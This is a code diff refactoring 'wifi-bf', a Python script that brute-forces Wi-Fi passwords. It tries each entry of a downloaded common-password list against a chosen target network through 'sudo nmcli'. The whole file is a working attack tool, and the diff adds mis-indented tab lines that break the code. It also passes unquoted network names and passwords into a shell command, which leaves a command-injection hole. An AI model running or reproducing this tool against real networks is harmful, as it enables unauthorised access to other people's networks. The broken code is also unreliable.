@@ -20,158 +20,111 @@ class bcolors:
     UNDERLINE = '\033[4m'
 
 
-"""
-    This function cutlize the argparse which gives a description of the program and
-    the list of arguments supported
-"""
-
-
 def argument_parser():
-    parser = argparse.ArgumentParser(
-        prog="wifi-bf",
-        description="Brute force wifi password with python 3"
-    )
-
-    parser.add_argument(
-        '-u', '--url',
-        type=str,
-        default=None,
-        help='The url that contains the list of passwords'
-    )
-    parser.add_argument(
-        '-f', '--file',
-        type=str,
-        default=None,
-        help='The file that contains the list of passwords'
-    )
-    
-    parser.add_argument(
-    	'-v', '--verbose',
-    	action='store_true',
-    	help='Optional: Use to show all passwords attempted, rather than just the successful one.'
-    )
-
+    """
+    This function utilize the argparse which gives a description of the program and
+    the list of arguments supported
+    """
+    parser = argparse.ArgumentParser(prog="wifi-bf", description="Brute force wifi password with python 3")
+    parser.add_argument('-u', '--url', type=str, default=None, help='The url that contains the list of passwords')
+    parser.add_argument('-f', '--file', type=str, default=None, help='The file that contains the list of passwords')
+    parser.add_argument('-v', '--verbose', action='store_true',
+                        help='Optional: Use to show all passwords attempted, rather than just the successful one.')
     return parser.parse_args()
 
 
-"""
-	This functions returns a list of passwords from a url
-"""
-
-
 def fetch_password_from_url(url):
+    """
+    This functions returns a list of passwords from a url
+    """
     try:
         return urllib.request.urlopen(url)
-    except:
-        sys.exit(bcolors.FAIL+"Fetch failed. Check internet status."+bcolors.ENDC)
-
-
-"""
-	This functions checks whether the user is running the program as root. If the user is not a root,
-	an error message is displayed and the program exit
-"""
+    except Exception as e:
+        raise Exception(f"{bcolors.FAIL} Fetch failed. Check internet status. {bcolors.ENDC}")
 
 
 def require_root():
+    """
+    This functions checks whether the user is running the program as root. If the user is not a root,
+    an error message is displayed and the program exit
+    """
     r = os.popen("whoami").read()
-    if (r.strip() != "root"):
+    if r.strip() != "root":
         print("Run it as root.")
         sys.exit(-1)
 
 
-"""
-	This functions shows the user the list of targets
-"""
-
-
 def display_targets(networks, security_type):
-	print("Select a target: \n")
-    
-	rows, columns = os.popen('stty size', 'r').read().split()
-	for i in range(len(networks)):
-		width = len(str(str(i+1)+". "+networks[i]+security_type[i]))+2
-		spacer = " "
-		
-		if (int(columns) >= 100):
-			calc = int((int(columns)-int(width))*0.75)
-		else:
-    			calc = int(columns)-int(width)
-    	
-		for index in range(calc):
-			spacer += "."
-			if index == (calc-1):
-				spacer += " "
-	    	
-		print(str(i+1)+". "+networks[i]+spacer+security_type[i])
+    """
+    This functions shows the user the list of targets
+    """
+    print("Select a target: \n")
 
+    rows, columns = os.popen('stty size', 'r').read().split()
+    for i in range(len(networks)):
+        width = len(str(str(i+1)+". "+networks[i]+security_type[i]))+2
+        spacer = " "
 
-"""
-	This functions prompt the user to enter the target choice and returns the choice.
-	The function runs in a loop until the user enter the correct target
-"""
+        if int(columns) >= 100:
+            calc = int((int(columns)-int(width))*0.75)
+        else:
+            calc = int(columns)-int(width)
+
+        for index in range(calc):
+            spacer += "."
+            if index == (calc-1):
+                spacer += " "
+
+        print(str(i+1)+". "+networks[i]+spacer+security_type[i])
 
 
 def prompt_for_target_choice(max):
+    """
+    This functions prompt the user to enter the target choice and returns the choice.
+    The function runs in a loop until the user enter the correct target
+    """
     while True:
         try:
             selected = int(input("\nEnter number of target: "))
-            if(selected >= 1 and selected <= max):
+            if 1 <= selected <= max:
                 return selected - 1
         except Exception as e:
-            ignore = e
-
+            raise e
         print("Invalid choice: Please pick a number between 1 and " + str(max))
 
 
-"""
-	This function takes the targeted network and list of password and attempt to brute force it.
-"""
+def make_password_trial(selected_network, password_trial, args):
+
+    if args.verbose is True:
+        print(f"{bcolors.HEADER} ** TESTING **: with password '{password_trial}'. {bcolors.ENDC}")
+
+    if len(password_trial) >= 8:
+        creds = os.popen(f"sudo nmcli dev wifi connect {selected_network} password {password_trial}").read()
+        if "Error:" in creds.strip():
+            if args.verbose is True:
+                print(f"{bcolors.FAIL} ** TESTING **: password '{password_trial}' failed. {bcolors.ENDC}")
+        elif "successfully activated" in creds.strip():
+            sys.exit(f"{bcolors.OKGREEN} ** KEY FOUND! **: password {password_trial} succeeded. {bcolors.ENDC}")
+        else:
+            print(f"Something went wrong at trial {password_trial}")
+        print(creds)
+	time.sleep(3)
+    else:
+        if args.verbose is True:
+            print(f"{bcolors.OKCYAN} ** TESTING **: password {password_trial} too short, passing.{bcolors.ENDC}")
 
 
 def brute_force(selected_network, passwords, args):
-    for password in passwords:
-        # necessary due to NetworkManager restart after unsuccessful attempt at login
-        password = password.strip()
-
-        # when when obtain password from url we need the decode utf-8 however we doesnt when reading from file
-        if isinstance(password, str):
-            decoded_line = password
-        else:
-            decoded_line = password.decode("utf-8")
-            
-        if args.verbose is True:
-            print(bcolors.HEADER+"** TESTING **: with password '" +
-                decoded_line+"'"+bcolors.ENDC)
-
-        if (len(decoded_line) >= 8):
-            time.sleep(3)
-
-            creds = os.popen("sudo nmcli dev wifi connect " +
-                selected_network+" password "+decoded_line).read()
-                
-            # print(creds)
-
-            if ("Error:" in creds.strip()):
-            	if args.verbose is True:
-                    print(bcolors.FAIL+"** TESTING **: password '" +
-                        decoded_line+"' failed."+bcolors.ENDC)
-            else:
-            	sys.exit(bcolors.OKGREEN+"** KEY FOUND! **: password '" +
-                    decoded_line+"' succeeded."+bcolors.ENDC)
-        else:
-            if args.verbose is True:
-                print(bcolors.OKCYAN+"** TESTING **: password '" +
-                    decoded_line+"' too short, passing."+bcolors.ENDC)
-
-    print(bcolors.FAIL+"** RESULTS **: All passwords failed :("+bcolors.ENDC)
-
-
-"""
-	The main function
-"""
+    """
+    This function takes the targeted network and list of password and attempt to brute force it.
+    """
+    for password_trial in passwords:
+        make_password_trial(selected_network, password_trial, args)
+    print(f"{bcolors.FAIL} ** RESULTS **: All passwords failed :( {bcolors.ENDC}")
 
 
 def main():
+    """ The main function"""
     require_root()
     args = argument_parser()
 
@@ -187,10 +140,11 @@ def main():
             exit(0)
         file.close()
     else:
-        # fallback to the default list as the user didnt supplied a password list
+        # fallback to the default list as the user didn't supplied a password list
         default_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt"
         passwords = fetch_password_from_url(default_url)
-
+	passwords = [password.decode("utf-8") for password in passwords]
+    passwords = [password.strip() for password in passwords]
     # grabbing the list of the network ssids
     func_call = start(1)
     networks = func_call[0]
